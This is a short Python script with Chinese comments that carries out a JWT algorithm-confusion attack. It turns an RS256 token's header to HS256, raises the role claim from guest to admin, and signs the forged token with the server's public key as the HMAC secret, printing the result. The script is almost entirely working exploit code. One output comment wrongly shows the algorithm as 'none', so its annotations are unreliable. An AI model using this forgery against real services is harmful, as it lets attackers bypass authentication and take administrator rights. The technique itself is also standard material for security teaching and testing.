import json
import hmac
import base64
import hashlib

def jwt_decode(token):
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT")
    # 补全base64 padding并进行base64解码
    def _b64decode(s):
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)
    # 用loads加载json数据
    header = json.loads(_b64decode(parts[0]))
    payload = json.loads(_b64decode(parts[1]))
    signature = parts[2]  # 签名通常不 base64 解码（用于验证）
    return header, payload, signature

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.sDLUMYjEARQ-zhlpOYvK9gOyxIP__hkgWUTN4Jdby8TfHWts8fPwsMWqDs6Tzxz3ixtzjE7lD5tr9yTfbF9Dx26mXFyHowDf-lpbb5cxpRXiVDrSRc2PZu_AHNt_hzscNRMiM4t8FMCLpyjSNjdriIB8GegJUVsuM_DH5ubroO7UUEPyP1LTnJRp5vBxQKTyuB_ODTy-sZWXDV-QkEE7JY7kXHL1-lKwgaiN_9MO-pjMVSrN5t41u_JetdfSMHCk2dUm2rkL_9nxcrFa5Ov4eBnHEx58dAZBY50U4lCxEYb4i0h7l55qsl__MzztPPPXHi1i3FivJiolPEM978TD4g'
(h, p, s) = jwt_decode(token)
print("Header:", h)
# Header: {'typ': 'JWT', 'alg': 'RS256'}
print("Payload:", p)
# Payload: {'username': 'admin', 'role': 'guest'}
# JWT修改签名算法攻击 修改Header和Payload
h['alg'] = 'HS256'
print("Modified Header:", h)
# Modified Header: {'typ': 'JWT', 'alg': 'none'}
p['role'] = 'admin'
print("Modified Payload:", p)
# Modified Payload: {'username': 'admin', 'role': 'admin'}
# 读取publickey.pem
with open('publickey.pem') as f:
    key = f.read()

# 先转成JSON字符串再构造base64URL
header = json.dumps(h, separators=(',', ':'))
encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")
payload = json.dumps(p, separators=(',', ':'))
encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodePayload = str(encodePBytes, "utf-8").rstrip("=")
# 伪造签名
token = (encodeHeader + "." + encodePayload)
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")
new_jwt = (token + "." + sig)
print(new_jwt)
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.WxKxR61Wm6EDqaTpqFKBQEe7mAyMp6YIxQpTScQer4c